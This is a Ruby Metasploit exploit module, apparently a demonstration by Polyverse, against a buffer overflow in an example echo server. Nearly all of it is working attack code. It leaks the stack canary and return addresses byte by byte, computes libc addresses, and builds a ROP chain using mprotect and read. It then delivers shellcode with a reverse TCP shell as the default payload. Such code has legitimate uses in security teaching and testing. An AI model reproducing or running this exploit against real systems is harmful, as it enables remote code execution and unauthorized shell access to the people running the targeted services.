class MetasploitModule < Msf::Exploit::Remote
    Rank = ManualRanking

    include Msf::Exploit::Remote::Tcp

    module Frame
        ARG = 0
	REQ = 1
	VAR = 2
    end

    module Variable
        LEN = 0 # Stack column containing length of variable
        RAW = 1 # Stack column containing raw bytes
        IDX = 2 # Stack column containing start index
        VAL = 3 # Stack column containing correct-endian value
    end

    module Target
	Linux = 0 # Generic Linux
    end

    def initialize(info = {})
        super(
            update_info(
                info,
                'Name'        => 'Polyverse readhook-node-echo-server example',
                'Description' => 'This is a module for exploiting a buffer overflow in readhook-node-echo-server',
                'Author'      => 'Polyverse Corp.',
                'References'  =>
                [
                    [ 'URL', 'https://polyverse.io' ],
                ],
                'Platform'    => 'linux',
                'Payload'     => {},
                'Arch'        => [ARCH_X64],
                'Targets'     => 
                [
                    [
                        'Linux x64',
                        {
                            'Arch'            => ARCH_X64,

			    'n_sleep_s'       => 0.5,      # Wait time, in seconds, between write/read pairs

                            'o_libc_lcsmr'    => 0x000036, # main return-to offset in __libc_start_main
                            'o_libc_lcsm'     => 0x01d92e, # readelf -s /lib/ld-musl-x86_64.so.1 | grep " __libc_start_main"`
                            'o_libc_mprotect' => 0x035ba3, # readelf -s /lib/ld-musl-x86_64.so.1 | grep " mprotect"`
                            'o_libc_read'     => 0x056c5d, # readelf -s /lib/ld-musl-x86_64.so.1 | grep " read"`
                            'o_libc_poprdi'   => 0x037801, # offset to gadget "pop rdi" in /lib/ld-musl-x86_64.so.1
                            'o_libc_poprsi'   => 0x046854, # offset to gadget "pop rsi" in /lib/ld-musl-x86_64.so.1
                            'o_libc_poprdx'   => 0x021202, # offset to gadget "pop rdx" in /lib/ld-musl-x86_64.so.1

                            's_stack_free'    => 0x010000, # save area to be putting our shellcode
                            's_stack_exec'    => 0x005000, # amount of stack to make executable
                            's_stack_length'  => 0x020000  # observed 0x21000
                        }
                    ]
                ],
                'DefaultTarget'  => Target::Linux, # This is an index into the array 'Targets" above
                'DefaultOptions' => {
                    'PAYLOAD' => 'linux/x64/shell_reverse_tcp'
                }
            )
        )

        register_options(
        [
            Opt::LPORT(5555),
            Opt::RPORT(8080),
	    OptBool.new('EXHAUSTIVE', [false, 'Exhaustive stack disclosure', false]),
	    OptBool.new('INTERACTIVE', [false, 'Interactive mode for live audiences and video generation.', false])
        ])
    end

    # Returns that the remote host is always vulnerable
    def check
        return Exploit::CheckCode::Vulnerable
    end

    def exploit
        print_status("Start...")

        if check() != Exploit::CheckCode::Vulnerable
            print_error("check() failed")
            return
        end

	# Endian-sensitive string-to-integer converter
        def str_to_int(str)
            if str.length > 8
                return nil
            end

            n = 0
            for i in 1..str.length
                if Rex::Arch.endian(target.arch) == ENDIAN_LITTLE
                    n = (n << 8) + str[str.length - i].ord
                else
                    n = (n << 8) + str[i - 1].ord
                end
            end

            return n
        end

        # Formatter for binary string to hex string
        def str_to_str16(str)
            return str.unpack('H*')
        end

        # Formatter for int to hex string
        def int_to_str16(i)
            return "0x" + i.to_s(16)
        end

        # Print utility for a header
        def print_header(hdr)
            print_status("-------------------------------------------------------------------")
            print_status("#{hdr}") 
            print_status("-------------------------------------------------------------------")
        end

        # Print utility for a separator
        def print_separator()
            print_status("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
        end

	# Handle automated/interactive actions
        def interact(step, action)
	    print_status()
	    print_status("STEP #{step}: #{datastore['INTERACTIVE'] ? "Press <Enter>" : "Proceed"} to #{action}")
	    if datastore['INTERACTIVE']
		exit() if gets[0].chomp().downcase() == 'q'
	    end

	    return step + 1
        end

	# Probe the next byte
	def probe_byte(buf)
            connect
            sock.write buf 
            sleep target['n_sleep_s']
            buf = sock.read(buf.length+1)
            disconnect

	    return buf
	end
	
        # Probe the next n bytes
        def probe_bytes(n, buf)
            for i in 1..n
		buf = probe_byte(buf)
	    end

	    # Return an updated "var" 4-tuple
            return [n, buf[-n, n], buf.length - n, str_to_int(buf[-n, n])], buf
	end

	# Probe a variable
        def probe_variable(key, var, buf)
            var, buf = probe_bytes(var[Variable::LEN], buf)

	    s = "[buffer+#{var[Variable::IDX].to_s()}] "
	    s += " " if var[Variable::IDX] < 100
	    s += "#{key}: ".ljust(13)
	    s += "#{str_to_str16(var[Variable::RAW])}".ljust(21)
	    s += "(#{int_to_str16(var[Variable::VAL])})" if var[Variable::VAL] != nil

            print_status(s)

            return var, buf
        end

	# Probe a frame and each of the variables in it
	def probe_frame(key, frame, step, buf)
            if frame[Frame::REQ] || datastore['EXHAUSTIVE']
                fname = key + frame[Frame::ARG]
	        step = interact(step, "leak the stack frame for " + key + "()")
                print_header("STACK FRAME: " + fname)
                frame[Frame::VAR].each { |key, var|
                    if var[Variable::LEN] == 0
                        print_separator()
                    else
                        frame[Frame::VAR][key], buf = probe_variable(key, var, buf)
                    end
	        }
              end

            return frame, step, buf
	end

	# Probe each of the frames
	def probe_frames(frames, step, buf)
            frames.each { |key, frame|
		frames[key], step, buf = probe_frame(key, frame, step, buf)
            }

	    return frames, step, buf
        end

        # Initialize
	frames = {
            "vuln_read" =>
	    [ "(client_fd)", true,
                {
                    "padding"     => [ 8, 0, 0, 0 ],
		    "canary"      => [ 8, 0, 0, 0 ],
		    "separator"   => [ 0, 0, 0, 0 ],
		    "rbp"         => [ 8, 0, 0, 0 ],
		    "rip"         => [ 8, 0, 0, 0 ]
	        }
	    ],
	    "main" =>
	    [ "(argc, argv, envp)", true,
                {
		    "uu1a"        => [ 4, 0, 0, 0 ],
		    "uu1b"        => [ 4, 0, 0, 0 ],
		    "envp"        => [ 8, 0, 0, 0 ],
		    "argv"        => [ 8, 0, 0, 0 ],
		    "uu4a"        => [ 4, 0, 0, 0 ],
		    "uu4b"        => [ 4, 0, 0, 0 ],
		    "argc"        => [ 4, 0, 0, 0 ],
		    "cli_len"     => [ 4, 0, 0, 0 ],
		    "server_fd"   => [ 4, 0, 0, 0 ],
		    "client_fd"   => [ 4, 0, 0, 0 ],
		    "server_addr" => [16, 0, 0, 0 ],
		    "client_addr" => [16, 0, 0, 0 ],
		    "uu11"        => [ 8, 0, 0, 0 ],
		    "canary"      => [ 8, 0, 0, 0 ],
		    "separator"   => [ 0, 0, 0, 0 ],
		    "rbp"         => [ 8, 0, 0, 0 ],
		    "rip"         => [ 8, 0, 0, 0 ]
	        }
	    ],
	    "__libc_start_main" =>
	    [ "(main, argc, argv, init, fini, ldso_fini)", false,
                {
		    "uu1"         => [ 8, 0, 0, 0 ],
		    "uu2"         => [ 8, 0, 0, 0 ],
		    "uu3a"        => [ 4, 0, 0, 0 ],
		    "uu3b"        => [ 4, 0, 0, 0 ],
		    "uu4"         => [ 8, 0, 0, 0 ],
		    "uu5"         => [ 8, 0, 0, 0 ],
		    "uu6"         => [ 8, 0, 0, 0 ],
		    "uu7"         => [ 8, 0, 0, 0 ],
		    "uu8"         => [ 8, 0, 0, 0 ],
		    "uu9"         => [ 8, 0, 0, 0 ],
		    "uua"         => [ 8, 0, 0, 0 ],
		    "uub"         => [ 8, 0, 0, 0 ],
		    "uuc"         => [ 8, 0, 0, 0 ],
		    "uud"         => [ 8, 0, 0, 0 ],
		    "uue"         => [ 8, 0, 0, 0 ],
		    "uuf"         => [ 8, 0, 0, 0 ],
		    "uug"         => [ 8, 0, 0, 0 ],
		    "uuh"         => [ 8, 0, 0, 0 ],
		    "uui"         => [ 8, 0, 0, 0 ],
		    "separator"   => [ 0, 0, 0, 0 ],
		    "rbx"         => [ 8, 0, 0, 0 ],
		    "rbp"         => [ 8, 0, 0, 0 ],
		    "r12"         => [ 8, 0, 0, 0 ],
		    "r13"         => [ 8, 0, 0, 0 ],
		    "r14"         => [ 8, 0, 0, 0 ],
		    "rip"         => [ 8, 0, 0, 0 ]
	        }
	    ],
	    "_start" =>
	    [ "(void)", false,
                {
                    "rsp" => [ 8, 0, 0, 0 ],
                    "rax" => [ 8, 0, 0, 0 ]
	        }
	    ]
        }

	# Leak the stack frames
	frames, step, buf = probe_frames(frames, 1, "01234567890123456789012345678901234567890123456789012345678901234567890123456789")

        # Compute the base address of libc
        a_libc_base = frames["main"][Frame::VAR]["rip"][Variable::VAL] - target['o_libc_lcsmr'] - target['o_libc_lcsm']

        # Compute the absolute addresses of ROP'y things from offsets into libc
        a_libc_mprotect = a_libc_base + target['o_libc_mprotect'] # Address of mprotect()
        a_libc_read     = a_libc_base + target['o_libc_read']     # Address of read()
        a_libc_poprdi   = a_libc_base + target['o_libc_poprdi']   # Address of gadget "pop rdi; ret"
        a_libc_poprsi   = a_libc_base + target['o_libc_poprsi']   # Address of gadget "pop rsi; ret"
        a_libc_poprdx   = a_libc_base + target['o_libc_poprdx']   # Address of gadget "pop rdx; ret"

	# Compute the stack addresses that we will need
        a_stack_top     = (frames["vuln_read"][Frame::VAR]["rbp"][Variable::VAL] + 4095) & 0x7ffffffff000
        a_stack_free    = a_stack_top - target['s_stack_free']    # Address of safe place for our payload

        # Print out our understanding of the situation
	step = interact(step, "compute required absolute addresses.")
        print_header("COMPUTED ADDRESSES")
        print_status("a_libc_base:       #{int_to_str16(a_libc_base)}")
        print_status("a_stack_top:       #{int_to_str16(a_stack_top)}")
        print_status("a_stack_free:      #{int_to_str16(a_stack_free)}")
        print_status("a_libc_mprotect:   #{int_to_str16(a_libc_mprotect)}")
        print_status("a_libc_read:       #{int_to_str16(a_libc_read)}")
        print_status("a_libc_poprdi:     #{int_to_str16(a_libc_poprdi)}")
        print_status("a_libc_poprsi:     #{int_to_str16(a_libc_poprsi)}")
        print_status("a_libc_poprdx:     #{int_to_str16(a_libc_poprdx)}")
        print_header("COMPLETE")

        # Start with buf up to the return address
        b = buf[0, frames["vuln_read"][Frame::VAR]["rip"][Variable::IDX]]

        # Make the stack writable
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdi)
        b += Rex::Arch.pack_addr(target.arch, a_stack_free)
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprsi)
        b += Rex::Arch.pack_addr(target.arch, target['s_stack_exec'])
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdx)
        b += Rex::Arch.pack_addr(target.arch, 0x7)
        b += Rex::Arch.pack_addr(target.arch, a_libc_mprotect)

        # Read the shellcode into the unused stack allocation
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdi)
        b += Rex::Arch.pack_addr(target.arch, frames["main"][Frame::VAR]["client_fd"][Variable::VAL])
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprsi)
        b += Rex::Arch.pack_addr(target.arch, a_stack_free)
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdx)
        b += Rex::Arch.pack_addr(target.arch, payload.encoded.length)
        b += Rex::Arch.pack_addr(target.arch, a_libc_read)

        # Return to the shellcode that we will place at a_stack_free
        b += Rex::Arch.pack_addr(target.arch, a_stack_free)

        # Exploit
	step = interact(step, "deliver exploit payload.")
        connect
        sock.write b
        sleep target['n_sleep_s']
        sock.write payload.encoded
        disconnect

        print_status("Done. (If successful, you should get a promptless shell.)")
    end
end
